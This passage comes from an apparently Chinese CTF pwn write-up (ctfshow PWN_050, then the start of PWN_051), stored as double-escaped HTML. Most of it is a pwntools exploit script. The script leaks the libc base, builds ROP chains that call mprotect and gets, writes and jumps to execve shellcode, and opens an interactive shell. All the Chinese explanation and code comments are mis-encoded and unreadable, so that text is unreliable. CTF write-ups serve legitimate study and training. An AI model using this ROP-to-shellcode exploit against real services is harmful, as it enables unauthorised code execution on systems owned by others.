&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;libc&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;address&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;libc_base&lt;/span&gt;  &lt;span class=&#34;c1&#34;&gt;# è®¾ç½®libcåŸºåœ°å€&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;success&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;libc_base = 0x&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;%x&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;libc_base&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;pop_rsi_ret&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;libc_base&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;pop_rsi_ret1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;pop_rdx_ret&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;libc_base&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;pop_rdx_ret1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;mprotect&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;libc&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sym&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;mprotect&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;gets&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;libc&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sym&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;gets&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# é˜¶æ®µ2ï¼šè°ƒç”¨mprotectä¿®æ”¹å†…å­˜æƒé™&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;cyclic&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x20&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;8&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p64&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;pop_rdi_ret&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p64&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;bss_start_address&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p64&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;pop_rsi_ret&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p64&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;size&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p64&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;pop_rdx_ret&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p64&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;proc&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p64&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;mprotect&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p64&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;recvuntil&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;sa&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;Hello CTFshow&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sendline&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;recv&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# é˜¶æ®µ3ï¼šåˆ©ç”¨getså†™å…¥shellcode&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;cyclic&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x20&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;8&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p64&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;pop_rdi_ret&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p64&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;shellcode_address&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p64&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;gets&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p64&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;recvuntil&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;sa&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;Hello CTFshow&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sendline&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;shellcode&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;asm&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;shellcraft&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sh&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;())&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sendline&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;shellcode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# é˜¶æ®µ4ï¼šè·³è½¬åˆ°shellcodeæ‰§è¡Œ&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;cyclic&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x20&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;8&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p64&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;shellcode_address&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;recvuntil&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;sa&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;Hello CTFshow&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sendline&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;interactive&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;è®©æˆ‘ç»™ä½ é€æ­¥è§£é‡Šï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;pop_rdx_ret1&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x0000000000001b96&lt;/span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;pop_rsi_ret1&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x0000000000023a6a&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;è¿™é‡Œå‰é¢æœ‰ä¸ª1æ˜¯æ–¹ä¾¿åŒºåˆ†ï¼Œè¿™ä¸¤ä¸ªgadgetæ˜¯åœ¨libcåº“ä¸Šçš„é€šç”¨gadgetï¼Œå—ASLRä¿æŠ¤ï¼Œåœ°å€æ˜¯åŠ¨æ€å˜åŒ–çš„ï¼Œéœ€è¦ç”¨&lt;code&gt;æ‰€æœ‰å‡½æ•°çš„çœŸå®åœ°å€ = libc åŸºåœ°å€ + å‡½æ•°çš„æœ¬åœ°åç§»&lt;/code&gt;å¾—å‡ºåœ°å€ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;libc_base&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;leak_address&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;libc&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sym&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;puts&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;æ³„éœ²putsåœ¨æœ¬åœ°ç¨‹åºçš„åœ°å€ï¼Œå†æ³„éœ²putså†libcåº“çš„åœ°å€æ¨å‡ºåç§»é‡ï¼Œå·²çŸ¥æœ¬åœ°ç¨‹åºçš„æ¯ä¸ªå‡½æ•°åœ°å€åç§»é‡ç›¸åŒï¼ŒçŸ¥é“åç§»é‡åï¼Œæ³„éœ²libcæ ‡å‡†åº“çš„gadgetï¼ˆ&lt;code&gt;/lib/x86_64-linux-gnu/libc.so.6&lt;/code&gt;ï¼‰å°±èƒ½åæ¨å‡ºæœ¬åœ°ç¨‹åºgadgetçš„çœŸå®åœ°å€ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;pop_rsi_ret&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;libc_base&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;pop_rsi_ret1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;pop_rdx_ret&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;libc_base&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;pop_rdx_ret1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;è¿™é‡Œæœ‰ä¸ªé—®é¢˜ï¼šä¸ºä»€ä¹ˆgets = libc.sym[&amp;lsquo;gets&amp;rsquo;]å°±æ˜¯çœŸå®åœ°å€å‘¢ï¼Œä½ ä¼šè®¤ä¸ºå®ƒå°±æ˜¯libcåº“çš„é€šç”¨åœ°å€ï¼Œæ˜¯ä¸æ˜¯åº”è¯¥åŠ ä¸Šæœ¬åœ°åç§»é‡å‘¢ï¼Ÿ&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;libc.sym[&#39;gets&#39;]&lt;/code&gt; æœ€ç»ˆæ˜¯çœŸå®åœ°å€çš„åŸå› æ˜¯ï¼š&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;å®ƒåŸæœ¬æ˜¯ â€œåç§»é‡â€ï¼ˆç›¸å¯¹äº libc åŸºåœ°å€ï¼‰ï¼›&lt;/li&gt;
&lt;li&gt;å½“ä½ è®¾ç½® &lt;code&gt;libc.address = libc_base&lt;/code&gt; åï¼Œ&lt;code&gt;pwntools&lt;/code&gt; è‡ªåŠ¨å°† â€œåŸºåœ°å€ + åç§»é‡â€ åˆå¹¶ï¼Œå¾—åˆ°çœŸå®åœ°å€ã€‚&lt;/li&gt;
&lt;/ol&gt;&lt;/blockquote&gt;
&lt;blockquote class=&#34;alert alert-note&#34;&gt;
    &lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;libc.address&lt;/code&gt; ä¸æ˜¯ä¸€ä¸ªå‡½æ•°ï¼Œè€Œæ˜¯ &lt;code&gt;pwntools&lt;/code&gt; ä¸­ &lt;code&gt;ELF&lt;/code&gt; ç±»çš„ä¸€ä¸ª&lt;strong&gt;å±æ€§ï¼ˆattributeï¼‰&lt;/strong&gt;ï¼Œç”¨äºå­˜å‚¨å’Œè®¾ç½® ELF æ–‡ä»¶ï¼ˆè¿™é‡Œç‰¹æŒ‡ libc åº“ï¼‰åœ¨å†…å­˜ä¸­çš„åŸºåœ°å€ã€‚&lt;/p&gt;
&lt;p&gt;å½“ä½ é€šè¿‡ &lt;code&gt;libc = ELF(&#39;libc.so.6&#39;)&lt;/code&gt; åŠ è½½ libc åº“åï¼Œ&lt;code&gt;libc.address&lt;/code&gt; é»˜è®¤å€¼ä¸º &lt;code&gt;0&lt;/code&gt;ï¼ˆè¡¨ç¤ºå°šæœªè®¾ç½®åŸºåœ°å€ï¼‰ã€‚&lt;/p&gt;&lt;/blockquote&gt;&lt;/blockquote&gt;
&lt;p&gt;æ€»çš„æ¥è¯´è¿™é¢˜è´¨é‡ä¸é”™ï¼Œè€—äº†æˆ‘ä¸¤å¤©ç©ºé—²æ—¶é—´å»æ”»å…‹ã€‚&lt;/p&gt;
&lt;h3 id=&#34;pwn_051&#34;&gt;PWN_051
&lt;/h3&gt;&lt;p&gt;é¢˜ç›®ï¼šIâ€˜m IronManï¼› &lt;a class=&#34;link&#34; href=&#34;PWN_051&#34; &gt;PWN_051&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/167.png&#34;
	width=&#34;825&#34;
	height=&#34;214&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/167_hu_87fa00768af6d9eb.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/167_hu_5d4af73eb38f32b1.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;32ä½å…³é—­æ ˆä¿æŠ¤ä»¥åŠPIE&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;385&#34;
		data-flex-basis=&#34;925px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;IDAæŠ½è±¡ğŸ¤¦â€ğŸ˜„&amp;hellip;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/168.png&#34;
	width=&#34;1545&#34;
	height=&#34;583&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/168_hu_85b4abbb3660f982.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/168_hu_f5473e747256948b.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;265&#34;
		data-flex-basis=&#34;636px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;è·Ÿè¿›mainå‡½æ•°ï¼Œè¿™æ¬¡å‡½æ•°åå­—æ¯”è¾ƒéš¾è®°ï¼Œå¯ä»¥æ”¹ä¸ªåå­—ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/169.png&#34;
	width=&#34;1035&#34;
	height=&#34;455&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/169_hu_9a03f1dbf9af4215.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/169_hu_1e041167a5b894e3.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;227&#34;
		data-flex-basis=&#34;545px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/170.png&#34;
	width=&#34;620&#34;
	height=&#34;180&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/170_hu_79a8cee284c0d251.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/170_hu_7c31f7e1b55ae952.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;æ›´æ”¹åå­—å&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;344&#34;
		data-flex-basis=&#34;826px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;è·Ÿè¿›ctfshowå‡½æ•°ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/171.png&#34;
	width=&#34;660&#34;
	height=&#34;1080&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/171_hu_c36869fb038422ed.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/171_hu_cd0446a43f1edacb.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;61&#34;
		data-flex-basis=&#34;146px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;å¾ˆæ˜æ˜¾è¿™æ˜¯ç”¨C++å†™çš„ï¼Œè¿™é‡Œæˆ‘çœ‹çš„ä¸å¤ªæ‡‚ï¼Œå€Ÿç”¨AIè§£è¯»&amp;hellip;&lt;/p&gt;
